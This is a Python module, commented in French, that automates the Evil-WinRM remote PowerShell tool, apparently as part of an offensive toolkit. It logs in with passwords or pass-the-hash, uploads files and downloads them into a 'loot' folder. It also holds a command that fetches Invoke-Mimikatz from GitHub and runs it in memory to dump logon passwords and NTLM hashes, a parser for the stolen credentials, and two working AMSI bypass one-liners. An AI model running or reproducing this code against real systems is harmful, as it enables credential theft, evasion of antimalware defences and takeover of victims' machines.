"""
Evil-WinRM Module
=================
Shell PowerShell distant via WinRM
"""

from typing import Dict, Any, List, Optional
from datetime import datetime
from core.executor import CommandExecutor
import os
import shlex


class EvilWinRMModule:
    """
    Module pour Evil-WinRM
    - Shell PowerShell distant
    - Upload/Download de fichiers
    - Exécution de scripts
    - Bypass AMSI/AV
    """
    
    def __init__(self):
        self.executor = CommandExecutor()
        self.loot_dir = "/tmp/evil-winrm-loot"
        os.makedirs(self.loot_dir, exist_ok=True)

    def _build_base_args(
        self,
        target: str,
        username: str,
        password: str,
        hash_val: str
    ) -> List[str]:
        args = ["evil-winrm", "-i", str(target), "-u", str(username)]
        if password:
            args.extend(["-p", str(password)])
        elif hash_val:
            args.extend(["-H", str(hash_val)])
        return args

    async def _run_base(
        self,
        base_args: List[str],
        timeout: int,
        stdin_command: Optional[str] = None
    ):
        stdin_data = f"{stdin_command}\n" if stdin_command else None
        return await self.executor.run_args(base_args, timeout=timeout, stdin_data=stdin_data)
    
    async def check_access(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Vérifie l'accès WinRM avec les credentials fournis
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        domain = options.get("domain", "")
        
        base_args = self._build_base_args(target, username, password, hash_val)
        cmd = " ".join(shlex.quote(part) for part in base_args)
        result = await self._run_base(base_args, timeout=30, stdin_command="whoami")
        
        # Vérifier si l'accès est réussi
        access_ok = "Evil-WinRM" in result.stdout or "PS " in result.stdout or result.return_code == 0
        
        return {
            "action": "evilwinrm_check",
            "target": target,
            "status": "completed" if access_ok else "error",
            "command": cmd.replace(password, "****") if password else cmd,
            "output": result.stdout,
            "error": result.stderr if not access_ok else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "access_granted": access_ok,
                "username": username,
                "auth_method": "password" if password else "hash" if hash_val else "none"
            }
        }
    
    async def execute_command(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute une commande PowerShell via Evil-WinRM
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        command = options.get("command", "whoami /all")
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_cmd = " ".join(shlex.quote(part) for part in base_args)
        result = await self._run_base(base_args, timeout=120, stdin_command=command)
        
        return {
            "action": "evilwinrm_exec",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": f"{base_cmd.replace(password, '****') if password else base_cmd} -c '{command}'",
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "command_executed": command,
                "output_lines": len(result.stdout.split('\n'))
            }
        }
    
    async def execute_script(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute un script PowerShell via Evil-WinRM
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        script_path = options.get("script", "")
        
        if not script_path:
            return {
                "action": "evilwinrm_script",
                "target": target,
                "status": "error",
                "error": "script path est requis",
                "timestamp": datetime.now().isoformat()
            }
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_args.extend(["-s", os.path.dirname(script_path)])
        cmd = " ".join(shlex.quote(part) for part in base_args)
        
        result = await self.executor.run_args(base_args, timeout=300)
        
        return {
            "action": "evilwinrm_script",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": cmd.replace(password, "****") if password else cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "script": script_path
            }
        }
    
    async def upload_file(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Upload un fichier vers la cible
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        local_file = options.get("local_file", "")
        remote_path = options.get("remote_path", "C:\\Windows\\Temp\\")
        
        if not local_file:
            return {
                "action": "evilwinrm_upload",
                "target": target,
                "status": "error",
                "error": "local_file est requis",
                "timestamp": datetime.now().isoformat()
            }
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_cmd = " ".join(shlex.quote(part) for part in base_args)
        
        filename = os.path.basename(local_file)
        upload_cmd = f"upload {local_file} {remote_path}{filename}"

        result = await self._run_base(base_args, timeout=300, stdin_command=upload_cmd)
        
        return {
            "action": "evilwinrm_upload",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": base_cmd.replace(password, "****") if password else base_cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "local_file": local_file,
                "remote_path": f"{remote_path}{filename}"
            }
        }
    
    async def download_file(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Télécharge un fichier depuis la cible
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        remote_file = options.get("remote_file", "")
        
        if not remote_file:
            return {
                "action": "evilwinrm_download",
                "target": target,
                "status": "error",
                "error": "remote_file est requis",
                "timestamp": datetime.now().isoformat()
            }
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_cmd = " ".join(shlex.quote(part) for part in base_args)
        
        local_path = os.path.join(self.loot_dir, os.path.basename(remote_file))
        download_cmd = f"download {remote_file} {local_path}"

        result = await self._run_base(base_args, timeout=300, stdin_command=download_cmd)
        
        return {
            "action": "evilwinrm_download",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": base_cmd.replace(password, "****") if password else base_cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "remote_file": remote_file,
                "local_path": local_path
            }
        }
    
    async def run_mimikatz(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Exécute Invoke-Mimikatz via Evil-WinRM (si disponible)
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        mimikatz_cmd = options.get("mimikatz_command", "sekurlsa::logonpasswords")
        
        # Commande PowerShell pour charger et exécuter Mimikatz
        ps_cmd = f"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '{mimikatz_cmd}'"
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_cmd = " ".join(shlex.quote(part) for part in base_args)
        result = await self._run_base(base_args, timeout=180, stdin_command=ps_cmd)
        
        # Parser les credentials
        creds = self._parse_mimikatz_output(result.stdout)
        
        return {
            "action": "evilwinrm_mimikatz",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": base_cmd.replace(password, "****") if password else base_cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "mimikatz_command": mimikatz_cmd,
                "credentials": creds
            }
        }
    
    async def bypass_amsi(self, target: str, options: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Tente de bypasser AMSI
        """
        options = options or {}
        
        username = options.get("username", "")
        password = options.get("password", "")
        hash_val = options.get("hash", "")
        
        # Différentes techniques de bypass AMSI
        bypass_techniques = [
            "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
            "$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like '*iUtils') {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like '*Context') {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)",
        ]
        
        base_args = self._build_base_args(target, username, password, hash_val)
        base_cmd = " ".join(shlex.quote(part) for part in base_args)
        
        # Essayer la première technique
        ps_cmd = bypass_techniques[0]

        result = await self._run_base(base_args, timeout=60, stdin_command=ps_cmd)
        
        return {
            "action": "evilwinrm_amsi_bypass",
            "target": target,
            "status": "completed" if result.return_code == 0 else "error",
            "command": base_cmd.replace(password, "****") if password else base_cmd,
            "output": result.stdout,
            "error": result.stderr if result.return_code != 0 else None,
            "duration": result.duration,
            "timestamp": result.timestamp,
            "parsed_data": {
                "technique_used": "AmsiUtils reflection bypass",
                "success": "error" not in result.stdout.lower() and result.return_code == 0
            }
        }
    
    def _parse_mimikatz_output(self, output: str) -> List[Dict[str, str]]:
        """Parse la sortie de Mimikatz"""
        creds = []
        current_cred = {}
        
        for line in output.split('\n'):
            line = line.strip()
            
            if 'Username' in line and ':' in line:
                if current_cred:
                    creds.append(current_cred)
                current_cred = {'username': line.split(':')[1].strip()}
            elif 'Domain' in line and ':' in line:
                current_cred['domain'] = line.split(':')[1].strip()
            elif 'NTLM' in line and ':' in line:
                current_cred['ntlm'] = line.split(':')[1].strip()
            elif 'Password' in line and ':' in line:
                pwd = line.split(':')[1].strip()
                if pwd and pwd != '(null)':
                    current_cred['password'] = pwd
        
        if current_cred:
            creds.append(current_cred)
        
        return creds
